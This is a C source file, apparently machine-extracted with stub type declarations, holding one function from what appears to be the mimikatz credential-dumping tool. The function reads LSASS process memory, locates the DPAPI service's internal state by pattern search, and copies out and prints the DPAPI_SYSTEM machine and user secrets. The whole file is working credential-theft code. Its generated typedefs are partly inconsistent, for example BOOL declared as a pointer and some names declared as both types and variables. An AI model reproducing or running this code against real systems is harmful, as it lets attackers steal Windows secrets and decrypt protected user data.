
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_15__ TYPE_7__ ;
typedef struct TYPE_14__ TYPE_6__ ;
typedef struct TYPE_13__ TYPE_3__ ;
typedef struct TYPE_12__ TYPE_2__ ;
typedef struct TYPE_11__ TYPE_1__ ;


typedef int wchar_t ;
typedef int rgbSystemCredUser ;
typedef int rgbSystemCredMachine ;
typedef int fSystemCredsInitialized ;
struct TYPE_15__ {int isInit; scalar_t__ isPresent; } ;
struct TYPE_11__ {scalar_t__ BuildNumber; } ;
struct TYPE_14__ {TYPE_1__ osContext; int * hLsassMem; } ;
struct TYPE_13__ {int ** address; int * member_1; int * member_0; } ;
struct TYPE_12__ {TYPE_7__ Module; } ;
typedef void* PVOID ;
typedef TYPE_2__* PKUHL_M_SEKURLSA_PACKAGE ;
typedef int NTSTATUS ;
typedef TYPE_3__ KULL_M_MEMORY_ADDRESS ;
typedef int BYTE ;
typedef int * BOOL ;


 int ARRAYSIZE (int ) ;
 int KULL_M_MEMORY_GLOBAL_OWN_HANDLE ;
 scalar_t__ KULL_M_WIN_MIN_BUILD_8 ;
 scalar_t__ NT_SUCCESS (int ) ;
 int PRINT_ERROR (char*) ;
 int SHA_DIGEST_LENGTH ;
 int SysCredReferences ;
 TYPE_6__ cLsass ;
 int kprintf (char*) ;
 int kuhl_m_sekurlsa_acquireLSA () ;
 TYPE_2__ kuhl_m_sekurlsa_dpapi_lsa_package ;
 TYPE_2__ kuhl_m_sekurlsa_dpapi_svc_package ;
 scalar_t__ kuhl_m_sekurlsa_utils_search_generic (TYPE_6__*,TYPE_7__*,int ,int ,void**,void**,void**,int *) ;
 scalar_t__ kull_m_memory_copy (TYPE_3__*,TYPE_3__*,int) ;
 int kull_m_string_wprintf_hex (int *,int,int ) ;

NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
{
 NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
 KULL_M_MEMORY_ADDRESS aLsass = {((void*)0), cLsass.hLsassMem}, aLocal = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 PKUHL_M_SEKURLSA_PACKAGE pPackage = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
 PVOID pBool = ((void*)0), pShaSystem = ((void*)0), pShaUser = ((void*)0);
 BOOL fSystemCredsInitialized;
 BYTE origInit, rgbSystemCredMachine[SHA_DIGEST_LENGTH], rgbSystemCredUser[SHA_DIGEST_LENGTH];

 if(NT_SUCCESS(status))
 {
  if(pPackage->Module.isPresent)
  {
   origInit = pPackage->Module.isInit;
   if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &pPackage->Module, SysCredReferences, ARRAYSIZE(SysCredReferences), &pBool, &pShaSystem, &pShaUser, ((void*)0)))
   {
    pPackage->Module.isInit = origInit;
    aLocal.address = &fSystemCredsInitialized;
    aLsass.address = pBool;
    if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(fSystemCredsInitialized)))
    {
     if(fSystemCredsInitialized)
     {
      kprintf(L"DPAPI_SYSTEM\n");
      aLocal.address = &rgbSystemCredMachine;
      aLsass.address = pShaSystem;
      if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(rgbSystemCredMachine)))
      {
       aLocal.address = &rgbSystemCredUser;
       aLsass.address = pShaUser;
       if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(rgbSystemCredUser)))
       {
        kprintf(L"full: ");
        kull_m_string_wprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
        kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
        kprintf(L"\nm/u : ");
        kull_m_string_wprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
        kprintf(L" / ");
        kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
        kprintf(L"\n");
       }
      }
     }
     else PRINT_ERROR(L"Not initialized!\n");
    }
   }
   else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
  }
  else PRINT_ERROR(L"DPAPI service not in LSASS memory\n");
 }
 return status;
}
